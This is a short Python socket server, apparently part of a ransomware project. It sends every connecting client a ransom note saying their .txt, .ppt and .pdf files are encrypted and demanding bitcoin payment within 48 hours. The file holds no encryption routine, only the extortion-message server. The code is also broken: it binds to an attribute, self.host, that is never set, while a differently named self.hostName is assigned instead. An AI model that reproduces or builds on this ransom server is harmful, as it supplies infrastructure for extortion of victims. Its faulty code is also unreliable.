# server.py 
import socket                                         

class Server():
    def __init__(self):
        #message that the server will send to the client
        self.message = """ All of your .txt, .ppt, .pdf files have been encrypted!!.
                 Provide Payment!\n Please send money to the bitcoin address 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 
                 in the next 48 hours or you will lose access to your files """
        self.port = 9999
        
    def get_socket(self):
        # create a socket object
        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        self.hostName = socket.gethostname() 
                          

    def start_server(self):
        # bind to the port
        self.serversocket.bind((self.host, self.port))                                  
        # queue up to 5 client connections
        self.serversocket.listen(5)                                           
        while True:
            # establish and wait for a connection
            try:
                clientsocket, addr = self.serversocket.accept()      
                print("Got a connection from %s" % str(addr))
                clientsocket.send(self.message.encode('ascii'))
                clientsocket.close()
                
            except Exception as e:
                print("there was an error in accepting the socket connection: ", e)
            
            
if __name__ == '__main__':
    serv = Server()
    serv.get_socket()
    serv.start_server()
    
    